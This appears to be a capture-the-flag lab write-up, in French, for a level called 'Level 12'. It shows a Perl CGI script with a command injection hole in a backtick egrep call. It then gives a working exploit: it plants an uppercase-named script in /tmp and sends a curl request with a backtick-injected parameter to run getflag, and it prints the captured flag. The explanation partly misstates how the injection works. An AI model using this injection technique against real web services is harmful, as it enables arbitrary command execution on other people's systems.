# LEVEL 12

```perl
#!/usr/bin/env perl

use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Egrep execute un fichier dont le nom match le pattern `$xx` (c-a-d **en majuscule, sans espace**) \

On glisse la commande `getflag` dans un fichier qui suit ce pattern pour pouvoir `egrep` dessus:

on creer un fichier en lettres majuscules 'HAKERMAN.SH' et '/*/HAKERMAN.sh' pour que '/tmp/HAKERMAN.SH' soit convertit en  '/TMP/HAKERMAN.SH'

```
echo "getflag > /tmp/myprecious" > /tmp/HAKERMAN.SH
chmod +x /tmp/HAKERMAN.SH
curl '127.0.0.1:4646?x="`/*/HAKERMAN.SH`"'
cat /tmp/myprecious
g1qKMiRpXf53AWhDaU7FEkczr
```
